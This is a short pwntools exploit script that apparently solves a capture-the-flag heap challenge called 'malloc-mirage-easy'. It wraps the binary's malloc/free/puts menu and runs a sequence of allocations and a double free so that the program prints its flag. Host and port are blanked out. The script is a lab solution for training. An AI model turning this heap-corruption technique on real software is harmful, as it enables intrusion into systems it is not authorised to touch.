#!/usr/bin/env python3
from pwn import *

PORT = 0000
HOST = "000000000"
elf = context.binary = ELF('/challenge/malloc-mirage-easy', checksec=False)
# libc = ELF('./libc.so.6', checksec=False)
# ld = ELF('./ld-linux-x86-64.so.2', checksec=False)

def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''
            set resolve-heap-via-heuristic force
            brva 0x0000000000001B5C
            brva 0x0000000000001DFC
            brva 0x0000000000001C5B
            c
            set follow-fork-mode parent
            ''')

def conn():
    if args.REMOTE:
        return remote(HOST, PORT)
    else:
        return elf.process()

p = conn()

prompt = b"Function (malloc/free/puts/read_flag/puts_flag/quit): "

def sla(pr, dt): p.sendlineafter(pr, dt)
def sa(pr, dt): p.sendafter(pr, dt)

def malloc(idx, sz):
    sla(prompt, b'malloc')
    sla(b'Index: ', str(idx).encode())
    sla(b'Size: ', str(sz).encode())

def free(idx):
    sla(prompt, b'free')
    sla(b'Index: ', str(idx).encode())


def puts(idx):
    sla(prompt, b'puts')
    sla(b'Index: ', str(idx).encode())

def puts_flag():
    sla(prompt, b'puts_flag')

def read_flag():
    sla(prompt, b'read_flag')



malloc(0, 0x1A8)
malloc(1, 0x1A8)
free(1)
free(0)
read_flag()
free(0)
# GDB()

malloc(2, 0x1A8)

puts_flag()

p.interactive()